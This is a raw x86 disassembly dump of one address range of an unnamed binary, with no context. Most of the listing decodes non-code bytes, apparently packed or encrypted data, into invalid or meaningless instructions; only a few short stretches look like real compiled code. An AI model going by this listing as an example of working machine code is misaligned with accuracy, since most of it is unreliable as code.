  405c06:	xor    eax,0xd913acb7
  405c0b:	adc    eax,0x9551e2eb
  405c10:	pop    edi
  405c11:	and    DWORD PTR [edi-0x930f3fa],0x6d
  405c18:	imul   esp,DWORD PTR [edx],0xfdcbd71a
  405c1e:	ins    DWORD PTR es:[edi],dx
  405c1f:	test   eax,0xf2fa7157
  405c24:	mul    BYTE PTR [edi-0x41]
  405c27:	lahf   
  405c28:	pop    edx
  405c29:	sbb    dl,BYTE PTR [ebx]
  405c2b:	(bad)  
  405c2d:	push   0xffffff8f
  405c2f:	cwde   
  405c30:	lock fs fs mov ah,0xef
  405c35:	cld    
  405c36:	cmp    DWORD PTR [esp+ecx*1+0x10],0xd8f9dd92
  405c3e:	push   edi
  405c3f:	hlt    
  405c40:	sahf   
  405c41:	xchg   ebp,eax
  405c42:	mov    al,0x1a
  405c44:	retf   
  405c45:	jno    0x405c50
  405c47:	pusha  
  405c48:	retf   0x53a6
  405c4b:	mov    esp,0x47b8ae4e
  405c50:	push   eax
  405c51:	les    ecx,FWORD PTR [ebx+ebp*8]
  405c54:	mov    al,ds:0xfd971287
  405c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c5a:	mov    ebp,0xe5b50e2d
  405c5f:	test   DWORD PTR [eax+0xd597dbe],esp
  405c65:	mov    ebp,DWORD PTR [esi+0x35]
  405c68:	pop    ss
  405c69:	pop    esi
  405c6a:	jno    0x405ca9
  405c6c:	repz mov ecx,edx
  405c6f:	mov    edx,0x2b56263d
  405c74:	pusha  
  405c75:	cmp    BYTE PTR [ebx],dh
  405c77:	rcr    DWORD PTR [esp+edi*4-0x17],0xaa
  405c7c:	dec    ebx
  405c7d:	loopne 0x405c0f
  405c7f:	push   0xffffffe2
  405c81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c82:	adc    BYTE PTR [ebp-0x6c],ch
  405c85:	jae    0x405d03
  405c87:	xchg   esi,eax
  405c88:	in     eax,dx
  405c89:	es mov ecx,0x47dfb441
  405c8f:	and    edx,edx
  405c91:	dec    edx
  405c92:	cld    
  405c93:	inc    ebx
  405c94:	outs   dx,BYTE PTR ds:[esi]
  405c95:	mov    dh,0xb3
  405c97:	daa    
  405c98:	loopne 0x405d04
  405c9a:	push   ds
  405c9b:	stos   BYTE PTR es:[edi],al
  405c9c:	hlt    
  405c9d:	jmp    0xcf27:0xef53683a
  405ca4:	adc    ch,BYTE PTR [esi]
  405ca6:	inc    esi
  405ca7:	dec    esp
  405ca8:	into   
  405ca9:	loop   0x405cec
  405cab:	lock popa 
  405cad:	mov    ah,0x5c
  405caf:	mov    dh,0x20
  405cb1:	cmp    ebp,DWORD PTR [edx+0x73]
  405cb4:	cmp    edx,DWORD PTR [eax+0x3d]
  405cb7:	fidivr DWORD PTR [ebx+0x78]
  405cba:	in     eax,0x6d
  405cbc:	mov    edx,0xf91793ba
  405cc1:	iret   
  405cc2:	rcr    DWORD PTR [edi+0x59],cl
  405cc5:	loop   0x405c65
  405cc7:	idiv   ebp
  405cc9:	int    0xad
  405ccb:	stos   DWORD PTR es:[edi],eax
  405ccc:	mov    dl,0xfb
  405cce:	data16 jns 0x405d34
  405cd1:	in     al,0x94
  405cd3:	loope  0x405c7c
  405cd5:	adc    DWORD PTR [ebx+ebx*4+0x52ce8332],edi
  405cdc:	inc    edx
  405cdd:	lods   eax,DWORD PTR ds:[esi]
  405cde:	jg     0x405ced
  405ce0:	in     al,0x45
  405ce2:	mov    cl,0x46
  405ce4:	adc    eax,0xbbf4019b
  405ce9:	js     0x405c8b
  405ceb:	sub    BYTE PTR [esi],ah
  405ced:	push   ebx
  405cee:	cmp    ecx,edx
  405cf0:	int3   
  405cf1:	pop    ds
  405cf2:	xchg   esp,eax
  405cf3:	mov    eax,DWORD PTR [ecx+edi*8-0x27]
  405cf7:	add    cl,BYTE PTR [ebx-0x5083be87]
  405cfd:	fstp   TBYTE PTR [esi]
  405cff:	hlt    
  405d00:	xor    al,0x78
  405d02:	aam    0xae
  405d04:	(bad)  
  405d06:	add    ch,0xc6
  405d09:	push   edi
  405d0a:	shl    BYTE PTR [edi+edi*2-0x2f849b2c],cl
  405d11:	mov    cl,0x39
  405d13:	add    DWORD PTR [edi-0x55],ebx
  405d16:	inc    edi
  405d17:	mov    ah,0x3b
  405d19:	push   ss
  405d1a:	mov    ebp,0x4df3b19
  405d1f:	mov    BYTE PTR [eax-0x7b],ch
  405d22:	rol    BYTE PTR [ebp+0x2a],0x1b
  405d26:	js     0x405cda
  405d28:	sub    ecx,0x29d00fd
  405d2e:	fcomp  QWORD PTR [eax+0x36fd3afc]
  405d34:	stos   BYTE PTR es:[edi],al
  405d35:	mov    ch,0x45
  405d37:	daa    
  405d38:	dec    ebx
  405d39:	call   0x22ff059f
  405d3e:	push   edx
  405d3f:	aas    
  405d40:	(bad)  
  405d41:	sub    al,BYTE PTR [esi]
  405d43:	xor    ecx,edx
  405d45:	mov    bh,0x99
  405d47:	(bad)  
  405d48:	out    0x65,al
  405d4a:	mov    ds:0x30d335b7,eax
  405d4f:	pop    ebp
  405d50:	sti    
  405d51:	or     eax,0xd1f5f679
  405d56:	jge    0x405d66
  405d58:	xchg   DWORD PTR [edx+esi*1],eax
  405d5b:	das    
  405d5c:	imul   ebx,esi,0x6a
  405d5f:	lods   eax,DWORD PTR ds:[esi]
  405d60:	dec    esp
  405d61:	fnstsw WORD PTR [ebx+0x8]
  405d64:	dec    eax
  405d65:	xchg   esi,eax
  405d66:	push   0x7a
  405d68:	out    0x48,eax
  405d6a:	mov    dh,0xcb
  405d6c:	dec    ebx
  405d6d:	sub    DWORD PTR [ebx],edi
  405d6f:	mov    eax,ds:0x6b9349e9
  405d74:	hlt    
  405d75:	adc    cl,BYTE PTR [edi]
  405d77:	mov    esp,0x847fd72
  405d7c:	repnz pop esp
  405d7e:	xchg   edi,eax
  405d7f:	idiv   DWORD PTR [edi-0x9]
  405d82:	mov    BYTE PTR [edx],ah
  405d84:	push   ds
  405d85:	ret    0x3959
  405d88:	and    BYTE PTR [esi+0x53ff248a],al
  405d8e:	fxch   st(7)
  405d90:	cmp    DWORD PTR [ecx-0x75],esp
  405d93:	inc    ebp
  405d94:	lock mov eax,DWORD PTR [eax+0x198]
  405d9b:	push   DWORD PTR [eax]
  405d9d:	call   0x40cdc5
  405da2:	mov    DWORD PTR [ebp-0x8],eax
  405da5:	cmp    DWORD PTR [ebp-0x8],0x0
  405da9:	lea    eax,[ebp+0x4]
  405dac:	jmp    0x405fa4
  405db1:	xchg   ebx,eax
  405db2:	leave  
  405db3:	ror    DWORD PTR [esi-0x2eae69af],1
  405db9:	mov    ds:0xd49c135b,al
  405dbe:	mov    dh,0x38
  405dc0:	aas    
  405dc1:	inc    edi
  405dc2:	aaa    
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405d85
  405dca:	and    bl,dh
  405dcc:	and    al,0x97
  405dce:	jecxz  0x405e15
  405dd0:	outs   dx,DWORD PTR ds:[esi]
  405dd1:	xchg   ebp,eax
  405dd2:	loope  0x405d72
  405dd4:	xor    al,0x8d
  405dd6:	mov    eax,ds:0x34a8cad2
  405ddb:	sar    ebx,0x7d
  405dde:	and    bl,BYTE PTR [edi+ecx*8]
  405de1:	xor    eax,0x37e419e8
  405de6:	xchg   DWORD PTR [esi-0x35],ebp
  405de9:	sbb    eax,DWORD PTR [edx]
  405deb:	and    al,ch
  405ded:	lods   eax,DWORD PTR ds:[esi]
  405dee:	cmp    esp,DWORD PTR [eax-0x221dc0e7]
  405df4:	lock test BYTE PTR [ebx+0x18],dl
  405df8:	stos   DWORD PTR es:[edi],eax
  405df9:	icebp  
  405dfa:	pop    ds
  405dfb:	sub    DWORD PTR ds:0x73571d55,0x69161da0
  405e05:	fisttp DWORD PTR [edi-0x18]
  405e08:	and    al,0x33
  405e0a:	outs   dx,BYTE PTR ds:[esi]
  405e0b:	jnp    0x405e01
  405e0d:	sti    
  405e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e0f:	xor    al,0xbb
  405e11:	mov    esp,0xd76fffad
  405e16:	sti    
  405e17:	popf   
  405e18:	xchg   edi,eax
  405e19:	ds push 0x9bc1ef1a
  405e1f:	fisub  DWORD PTR [esi]
  405e21:	mov    dl,0x80
  405e23:	xchg   BYTE PTR [edi],al
  405e25:	adc    eax,0x859f9b2a
  405e2a:	in     al,dx
  405e2b:	or     esi,DWORD PTR [ebx+0x75]
  405e2e:	mov    ebx,0x57e9f823
  405e33:	pop    ebx
  405e34:	stos   DWORD PTR es:[edi],eax
  405e35:	sbb    eax,eax
  405e37:	mov    ebp,0x5ee461c9
  405e3c:	or     eax,0xc2c527c6
  405e41:	cmc    
  405e42:	sar    DWORD PTR [ecx],0xae
  405e45:	mov    ebx,0x75fa412b
  405e4a:	sbb    dh,0xd8
  405e4d:	int    0x95
  405e4f:	lods   al,BYTE PTR cs:[esi]
  405e51:	xor    ebx,DWORD PTR [edx-0x5e]
  405e54:	scas   al,BYTE PTR es:[edi]
  405e55:	xchg   ebp,eax
  405e56:	mov    cl,0x7a
  405e58:	jge    0x405e66
  405e5a:	adc    BYTE PTR [eax-0x3],ch
  405e5d:	les    edx,FWORD PTR gs:[ecx+0xd7521ad]
  405e64:	mov    al,ds:0xe421db1b
  405e69:	imul   eax,DWORD PTR [ebp-0x7e72f7b0],0x6
  405e70:	push   ebx
  405e71:	xchg   edx,eax
  405e72:	aad    0x3
  405e74:	pusha  
  405e75:	cmp    edi,DWORD PTR ds:0xa03b928c
  405e7b:	jmp    0x405e3e
  405e7d:	inc    esp
  405e7e:	push   ebp
  405e7f:	xchg   ebx,eax
  405e80:	jle    0x405e82
  405e82:	cmp    DWORD PTR [edi-0x7f95172b],esp
  405e88:	loopne 0x405edf
  405e8a:	pop    ds
  405e8b:	lods   eax,DWORD PTR ds:[esi]
  405e8c:	add    DWORD PTR [esi+0x2f],edx
  405e8f:	inc    ecx
  405e90:	xchg   edx,eax
  405e91:	jle    0x405eee
  405e93:	mov    eax,0x32057b71
  405e98:	rcl    edx,cl
  405e9a:	xchg   ebx,eax
  405e9b:	mov    bh,0x74
  405e9d:	arpl   WORD PTR [ecx],cx
  405e9f:	aam    0x7
  405ea1:	mov    es,ebx
  405ea3:	cld    
  405ea4:	dec    eax
  405ea5:	fistp  WORD PTR [esp+ebx*2+0x3]
  405ea9:	sub    eax,0xd668516e
  405eae:	(bad)  
  405eb0:	xor    eax,DWORD PTR [ecx]
  405eb2:	jg     0x405ef3
  405eb4:	adc    al,al
  405eb6:	mov    DWORD PTR [ecx+0xa479a35],ebp
  405ebc:	sbb    BYTE PTR [ebp+0x3fbcd4a6],al
  405ec2:	stos   BYTE PTR es:[edi],al
  405ec3:	pop    edx
  405ec4:	scas   al,BYTE PTR es:[edi]
  405ec5:	hlt    
  405ec6:	jmp    0xb907:0x65ede3b
  405ecd:	jne    0x405e6e
  405ecf:	aam    0x99
  405ed1:	into   
  405ed2:	hlt    
  405ed3:	or     esi,ecx
  405ed5:	ss out dx,al
  405ed7:	and    al,0xc1
  405ed9:	cld    
  405eda:	fbld   TBYTE PTR [esi+0x76e14958]
  405ee0:	push   es
  405ee1:	leave  
  405ee2:	pop    edx
  405ee3:	pop    ss
  405ee4:	pop    es
  405ee5:	mov    eax,0xfb4956c7
  405eea:	das    
  405eeb:	(bad)  
  405eec:	jmp    0xa8e639f5
  405ef1:	pop    ss
  405ef2:	adc    ecx,DWORD PTR [edx+0x575135c1]
  405ef8:	push   0xfffffffd
  405efa:	(bad)  
  405efb:	cmc    
  405efc:	fisub  DWORD PTR [ebx+0x62354a81]
  405f02:	push   ebx
  405f03:	pop    ds
  405f04:	push   eax
  405f05:	jmp    0x405f01
  405f07:	mov    BYTE PTR [ecx+0x55fc6f6a],bl
  405f0d:	in     eax,0xf9
  405f0f:	fs test eax,0xc60512b1
  405f15:	push   edi
  405f16:	retf   
  405f17:	sbb    BYTE PTR [esi],ah
  405f19:	aas    
  405f1a:	sahf   
  405f1b:	adc    ebp,DWORD PTR [ebx+0x5ca6626f]
  405f21:	sbb    bl,BYTE PTR [edi-0x50]
  405f24:	(bad)  
  405f25:	mov    bh,0xc0
  405f27:	dec    edi
  405f28:	in     al,dx
  405f29:	or     eax,0x927fad8c
  405f2e:	jp     0x405f22
  405f30:	mov    dh,0xee
  405f32:	dec    edx
  405f33:	clc    
  405f34:	xor    al,0xfa
  405f36:	xor    al,0x5c
  405f38:	call   0x78a4:0x4f9e87e
  405f3f:	pop    ds
  405f40:	add    BYTE PTR [esi],dl
  405f42:	and    eax,0x8a59e07
  405f47:	inc    esp
  405f48:	addr16 ret 
  405f4a:	adc    al,0xb7
  405f4c:	sahf   
  405f4d:	imul   esp,DWORD PTR [ecx],0xfa0f4307
  405f53:	(bad)  
  405f56:	out    0x13,al
  405f58:	add    al,0x37
  405f5a:	jbe    0x405f94
  405f5c:	dec    esp
  405f5d:	inc    esp
  405f5e:	sbb    DWORD PTR [esi-0x1e],esp
  405f61:	cmp    esp,DWORD PTR ds:0x1d794f3a
  405f67:	cmp    BYTE PTR [esi-0x225c14ed],dh
  405f6d:	scas   al,BYTE PTR es:[edi]
  405f6e:	push   ds
  405f6f:	jmp    0xc520:0xd375f15f
  405f76:	call   0xc47b5019
  405f7b:	bound  edi,QWORD PTR [eax]
  405f7d:	or     ebx,esp
  405f7f:	mov    BYTE PTR [edi+ecx*8],ah
  405f82:	adc    eax,0xc9d8c2da
  405f87:	lock add bl,BYTE PTR [edx+0x45]
  405f8b:	je     0x405fc0
  405f8d:	xor    DWORD PTR [ebx-0xc5739f3],ebp
  405f93:	mov    eax,DWORD PTR [esi-0x4205774e]
  405f99:	das    
  405f9a:	cs lock inc ah
  405f9e:	inc    ebx
  405f9f:	imul   edi,DWORD PTR [edx],0x60
  405fa2:	gs inc edi
  405fa4:	mov    DWORD PTR [ebp-0x20],eax
  405fa7:	je     0x406a43
  405fad:	jmp    0x4061a5
  405fb2:	jmp    0x405fa8
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx+0x77]
  405fbf:	call   0x35dab0c4
  405fc4:	jle    0x406044
  405fc6:	push   ebp
  405fc7:	jg     0x406047
  405fc9:	jle    0x405fb1
  405fcb:	test   DWORD PTR [ebp-0x56],esi
  405fce:	cld    
  405fcf:	in     eax,dx
  405fd0:	add    BYTE PTR [edx-0x2a8e6ddd],dh
  405fd6:	icebp  
  405fd7:	stos   DWORD PTR es:[edi],eax
  405fd8:	ss dec eax
  405fda:	(bad)  
  405fdb:	adc    al,0xb8
  405fdd:	std    
  405fde:	pop    es
  405fdf:	in     al,0xaa
  405fe1:	mov    ebx,0xcf18c004
  405fe6:	pop    ds
  405fe7:	(bad)  
  405fe8:	out    dx,al
  405fe9:	rcl    BYTE PTR [edi+0x64677f6a],cl
  405fef:	mov    bl,bl
  405ff1:	push   esp
  405ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ff3:	ja     0x405fa3
  405ff5:	cdq    
  405ff6:	sbb    ebp,DWORD PTR [esi+eiz*1-0x21]
  405ffa:	sub    ebp,DWORD PTR ds:0x556bb127
  406000:	lea    ecx,[esi+0x42b4d37a]
  406006:	or     al,0x7
  406008:	sti    
  406009:	inc    edx
  40600a:	ins    DWORD PTR es:[edi],dx
  40600b:	inc    ecx
  40600c:	pop    ds
  40600d:	pushf  
  40600e:	jg     0x406007
  406010:	sub    BYTE PTR ds:0x51b5cad,dl
  406016:	retf   
  406017:	jecxz  0x406061
  406019:	retf   
  40601a:	int3   
  40601b:	mov    edx,0xfbb895cc
  406020:	push   0x235d4320
  406025:	jp     0x405fcb
  406027:	mov    ebp,0xfe49fbf0
  40602c:	mov    ecx,0x3dccb00a
  406031:	mov    dh,0xbb
  406033:	dec    ecx
  406034:	fsubrp st(6),st
  406036:	fcomp  QWORD PTR [esi]
  406038:	out    0x15,eax
  40603a:	rol    DWORD PTR [ebp-0x35edffa0],0x43
  406041:	adc    edx,DWORD PTR [esi+edx*8+0x3cc50aa4]
  406048:	inc    esp
  406049:	sub    DWORD PTR [esi],ebx
  40604b:	jne    0x405fe0
  40604d:	es out dx,al
  40604f:	es dec ecx
  406051:	mov    al,0x34
  406053:	lea    esi,[eax]
  406055:	icebp  
  406056:	push   cs
  406057:	(bad)  
  406059:	sbb    al,0x4d
  40605b:	jns    0x406038
  40605d:	jne    0x405ff2
  40605f:	mov    eax,0xe39ff3ab
  406064:	ds pop ss
  406066:	inc    esp
  406067:	dec    ebx
  406068:	stos   BYTE PTR es:[edi],al
  406069:	xor    al,0xdb
  40606b:	push   0xa8e6afda
  406070:	test   BYTE PTR [ecx-0x27],cl
  406073:	xor    bl,BYTE PTR [ecx]
  406075:	jns    0x406038
  406077:	and    ecx,DWORD PTR [ecx-0x5d]
  40607a:	xchg   ebx,eax
  40607b:	ret    0xc6b4
  40607e:	sbb    ch,BYTE PTR [eax-0xb4cc0d3]
  406084:	or     BYTE PTR [ebp+0x51],al
  406087:	xor    al,0x7f
  406089:	xchg   ebp,eax
  40608a:	xchg   edx,eax
  40608b:	sbb    al,0xa9
  40608d:	xlat   BYTE PTR ds:[ebx]
  40608e:	std    
  40608f:	xor    esi,DWORD PTR [esi]
  406091:	sbb    al,dl
  406093:	add    ch,dh
  406095:	data16 fimul DWORD PTR [eax+0x15c24e74]
  40609c:	scas   al,BYTE PTR es:[edi]
  40609d:	fld    QWORD PTR [eax-0x49]
  4060a0:	sbb    BYTE PTR [ebx-0x7f],ah
  4060a3:	lahf   
  4060a4:	add    BYTE PTR [esi+0x637b265f],dl
  4060aa:	mov    ecx,0xd1a2c0ab
  4060af:	in     al,0x5
  4060b1:	mov    eax,ds:0x9b3f867f
  4060b6:	das    
  4060b7:	stos   DWORD PTR es:[edi],eax
  4060b8:	cmp    al,0xf1
  4060ba:	sbb    BYTE PTR [ebx-0x68072bed],cl
  4060c0:	(bad)  
  4060c1:	pop    ecx
  4060c2:	cdq    
  4060c3:	data16 mov dh,BYTE PTR [eax]
  4060c6:	xor    DWORD PTR [ebx+0x2494bf0f],ecx
  4060cc:	aaa    
  4060cd:	xor    dl,BYTE PTR [eax+0x2b]
  4060d0:	or     BYTE PTR [ebp+ecx*2-0x4b],al
  4060d4:	add    eax,0xdd0b1d2b
  4060d9:	ins    BYTE PTR es:[edi],dx
  4060da:	xchg   esi,eax
  4060db:	or     ebx,DWORD PTR [ecx-0x726505b6]
  4060e1:	xlat   BYTE PTR ds:[ebx]
  4060e2:	mov    esp,0x8b34af98
  4060e7:	ins    BYTE PTR es:[edi],dx
  4060e8:	pop    ebp
  4060e9:	pop    ebx
  4060ea:	sbb    bh,bl
  4060ec:	push   eax
  4060ed:	fs jmp 0xfae5e442
  4060f3:	push   ebx
  4060f4:	push   eax
  4060f5:	ss inc esi
  4060f7:	adc    BYTE PTR ds:0x56b50e24,ah
  4060fd:	ds aad 0xf6
  406100:	mov    eax,ds:0x3083fa48
  406105:	adc    ebx,DWORD PTR [ebx-0x56c6ff2b]
  40610b:	pop    ss
  40610c:	push   esi
  40610d:	lods   eax,DWORD PTR ds:[esi]
  40610e:	lahf   
  40610f:	test   al,0x6a
  406111:	divps  xmm0,XMMWORD PTR [esp+edi*8+0x68]
  406116:	retf   0x7c3d
  406119:	pop    ebx
  40611a:	jg     0x40615a
  40611c:	(bad)  
  40611d:	inc    ecx
  40611e:	xlat   BYTE PTR ds:[ebx]
  40611f:	(bad)  
  406120:	fimul  WORD PTR [eax+0x4745e5c7]
  406126:	and    esi,DWORD PTR [edi+0x64c2f888]
  40612c:	gs jb  0x4060f1
  40612f:	and    DWORD PTR [edi+0x35],ecx
  406132:	or     ecx,eax
  406134:	rol    BYTE PTR [esi],0xfb
  406137:	ins    DWORD PTR es:[edi],dx
  406138:	pop    edi
  406139:	adc    eax,0xa0f3c2e2
  40613e:	sub    DWORD PTR [edi+0x3f98d7c4],esp
  406144:	xor    al,0xa3
  406146:	mov    eax,ds:0x87c6583b
  40614b:	adc    BYTE PTR [ebx*4+0x6e0b8861],al
  406152:	push   eax
  406153:	xor    ebx,ebx
  406155:	xchg   edx,eax
  406156:	push   esi
  406157:	dec    eax
  406158:	cmp    dh,BYTE PTR [eax+0x746a55d3]
  40615e:	push   ebx
  40615f:	dec    ebp
  406160:	and    al,0x7
  406162:	fs shl bl,0xac
  406166:	mov    al,ds:0xf3630214
  40616b:	mov    DWORD PTR [ebp-0x5da5918a],0xf7f095d9
  406175:	(bad)  
  406177:	lahf   
  406178:	dec    ebp
  406179:	fsub   st,st(7)
  40617b:	test   BYTE PTR [esi+edi*8],bl
  40617e:	(bad)  
  40617f:	pop    esi
  406180:	and    edx,ecx
  406182:	fchs   
  406184:	mov    edx,0x504db41
  406189:	imul   edi,DWORD PTR es:[edi],0x6e7e47db
  406190:	repnz arpl WORD PTR [eax+0x1fc5d41e],dx
  406197:	(bad)  
  406198:	jmp    0x40616a
  40619a:	jnp    0x40620e
  40619c:	mov    al,ds:0x2aac3b73
  4061a1:	fdiv   st,st(6)
  4061a3:	or     ebp,ecx
  4061a5:	lea    eax,[ebp-0x18]
  4061a8:	push   eax
  4061a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	jmp    0x40619a
  4061d3:	je     0x406191
  4061d5:	icebp  
  4061d6:	xor    edi,DWORD PTR [esi+0x7e]
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x4061e9
  4061de:	gs retf 0xfcb3
  4061e2:	inc    ebp
  4061e3:	sar    DWORD PTR [eax-0xc3f2842],cl
  4061e9:	or     edi,DWORD PTR [ebp-0x7aa44f2f]
  4061ef:	into   
  4061f0:	push   eax
  4061f1:	xor    eax,0xaa66f9cf
  4061f6:	fwait
  4061f7:	inc    BYTE PTR [edi+eiz*4+0x78]
  4061fb:	adc    eax,0x29131964
  406200:	ins    BYTE PTR es:[edi],dx
  406201:	cmp    edx,DWORD PTR [eax-0x76890ae0]
  406207:	pop    ebp
  406208:	add    edi,eax
  40620a:	int3   
  40620b:	mov    eax,ds:0x141524c
  406210:	inc    edi
  406211:	aaa    
  406212:	sub    al,0x14
  406214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406215:	mul    DWORD PTR [edi+0x7f]
  406218:	xor    eax,0x7ed67d10
  40621d:	fidiv  DWORD PTR [edx-0x71f38c01]
  406223:	mov    bh,0x4c
  406225:	arpl   WORD PTR [edi],bp
  406227:	mov    bh,0x53
  406229:	dec    eax
  40622a:	pop    esi
  40622b:	std    
  40622c:	lahf   
  40622d:	leave  
  40622e:	jnp    0x4061f8
  406230:	cdq    
  406231:	mov    ds:0x1275de0,eax
  406236:	call   0x76cba13c
  40623b:	xchg   ecx,eax
  40623c:	nop
  40623d:	jbe    0x40621d
  40623f:	push   edi
  406240:	add    DWORD PTR [eax],ebx
  406242:	jns    0x4061c7
  406244:	dec    edx
  406245:	add    al,0x14
  406247:	ficom  WORD PTR [ecx-0x128f8c9e]
  40624d:	jl     0x406209
  40624f:	rcl    DWORD PTR [edi+0xc],1
  406252:	dec    ebp
  406253:	jnp    0x4061d6
  406255:	dec    ebx
  406256:	pop    ss
  406257:	xchg   ebx,ebx
  406259:	pop    ecx
  40625a:	fwait
  40625b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40625c:	sbb    al,BYTE PTR [ecx-0xc79f335]
  406262:	mov    ah,BYTE PTR [eax]
  406264:	xor    al,0x2b
  406266:	adc    ebp,ebx
  406268:	sub    ebp,edx
  40626a:	pop    ecx
  40626b:	or     BYTE PTR [ecx-0x32216f76],0xb2
  406272:	and    ecx,DWORD PTR [esi+0x2e]
  406275:	xchg   edi,eax
  406276:	lods   al,BYTE PTR ds:[esi]
  406277:	xor    ecx,DWORD PTR [edx+0x4d]
  40627a:	rcr    DWORD PTR [edx+0x7986b2dc],0xff
  406281:	mov    ecx,0x6770201f
  406286:	adc    al,0x5c
  406288:	adc    esp,DWORD PTR [edi]
  40628a:	mov    esi,0x18e6daf2
  40628f:	leave  
  406290:	movups xmm0,XMMWORD PTR [ecx-0x3d2dfbe1]
  406297:	mov    dh,0x8b
  406299:	cmp    ecx,ebp
  40629b:	test   eax,0xccd6c144
  4062a0:	js     0x40629d
  4062a2:	cmp    DWORD PTR [edx],ecx
  4062a4:	fsub   DWORD PTR [ecx]
  4062a6:	mov    edx,0xf4b80e6e
  4062ab:	xchg   esp,eax
  4062ac:	enter  0x9d53,0x1
  4062b0:	cdq    
  4062b1:	adc    al,0x26
  4062b3:	loopne 0x40630b
  4062b5:	push   0x6a
  4062b7:	fwait
  4062b8:	jmp    0x40626e
  4062ba:	(bad)  
  4062bb:	lods   eax,DWORD PTR ds:[esi]
  4062bc:	adc    BYTE PTR ds:0x9d869980,bl
  4062c2:	enter  0x504b,0x20
  4062c6:	adc    ebp,esi
  4062c8:	xor    DWORD PTR [esi+0x7d],edi
  4062cb:	lods   eax,DWORD PTR ds:[esi]
  4062cc:	int    0x87
  4062ce:	add    BYTE PTR [edx],dl
  4062d0:	(bad)  
  4062d1:	mov    eax,0xed4d32a4
  4062d6:	loop   0x40627e
  4062d8:	xchg   ebp,eax
  4062d9:	push   cs
  4062da:	push   es
  4062db:	repnz pushf 
  4062dd:	les    ebp,FWORD PTR [ecx]
  4062df:	test   BYTE PTR [edx+0x3209cf9f],ah
  4062e5:	jno    0x4062b9
  4062e7:	(bad)  
  4062e8:	int    0x9b
  4062ea:	(bad)  
  4062eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062ec:	hlt    
  4062ed:	icebp  
  4062ee:	cdq    
  4062ef:	rol    bl,cl
  4062f1:	xor    BYTE PTR [edx-0x15],bl
  4062f4:	pop    esp
  4062f5:	push   edx
  4062f6:	aad    0xb8
  4062f8:	ins    BYTE PTR es:[edi],dx
  4062f9:	inc    esp
  4062fa:	les    esp,FWORD PTR ds:0xd6c11177
  406300:	out    0xd3,eax
  406302:	xchg   edi,eax
  406303:	sti    
  406304:	cmp    ch,BYTE PTR [ecx+0x11]
  406307:	hlt    
  406308:	mov    ch,0xda
  40630a:	addr16 jae 0x406382
  40630d:	mov    ch,0x38
  40630f:	pop    edi
  406310:	ins    DWORD PTR es:[edi],dx
  406311:	and    ah,BYTE PTR [edx-0x80]
  406314:	sub    ch,BYTE PTR [eax+ebp*4+0x48ff02a1]
  40631b:	popa   
  40631c:	ss dec edi
  40631e:	adc    ebp,DWORD PTR [ebx+edi*2+0x43]
  406322:	les    eax,FWORD PTR [edi]
  406324:	je     0x406393
  406326:	test   eax,0xbb754dd2
  40632b:	(bad)  
  40632c:	neg    DWORD PTR [ebx-0x451f3c02]
  406332:	jbe    0x40630b
  406334:	add    DWORD PTR [eax+0xe],edx
  406337:	mov    ch,0x60
  406339:	cmp    ah,dh
  40633b:	int    0x82
  40633d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40633e:	nop
  40633f:	mov    ecx,0x2878c4a4
  406344:	ins    DWORD PTR es:[edi],dx
  406345:	and    al,BYTE PTR [esi+ebx*8-0x7724e761]
  40634c:	add    dl,bh
  40634e:	jbe    0x40633c
  406350:	jecxz  0x406321
  406352:	fdivr  QWORD PTR [eax-0xa]
  406355:	dec    eax
  406356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406357:	jae    0x406331
  406359:	aaa    
  40635a:	jecxz  0x4062fe
  40635c:	cmp    al,0xa3
  40635e:	jmp    0x406366
  406360:	sbb    dl,0x40
  406363:	nop
  406364:	js     0x406387
  406366:	int3   
  406367:	mov    ds:0x4b41393e,eax
  40636c:	dec    edi
  40636d:	icebp  
  40636e:	fbld   TBYTE PTR [di+0x1d]
  406372:	in     al,0xc7
  406374:	adc    ebx,esp
  406376:	or     DWORD PTR [esi-0x74],edx
  406379:	dec    ebx
  40637a:	mov    cl,0x9b
  40637c:	test   BYTE PTR [ebx],0x1d
  40637f:	or     DWORD PTR ds:0x2920b60f,edi
  406385:	push   es
  406386:	mov    esi,0x19b1ac28
  40638b:	aad    0x36
  40638d:	dec    eax
  40638e:	jae    0x40637b
  406390:	jmp    0x4063a8
  406392:	stc    
  406393:	mov    edx,0xd3b0ebed
  406398:	test   ebp,edx
  40639a:	aaa    
  40639b:	loop   0x40633c
  40639d:	int3   
  40639e:	pushf  
  40639f:	inc    ecx
  4063a0:	aad    0x2b
  4063a2:	scas   eax,DWORD PTR es:[edi]
  4063a3:	out    dx,al
  4063a4:	pop    ecx
  4063a5:	or     BYTE PTR [ecx-0x2a341748],cl
  4063ab:	scas   al,BYTE PTR es:[edi]
  4063ac:	cwde   
  4063ad:	adc    DWORD PTR [ecx],eax
  4063af:	ficomp WORD PTR cs:[ebx-0x302f0a68]
  4063b6:	push   eax
  4063b7:	push   0xfff475ff
  4063bc:	jne    0x4063aa
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
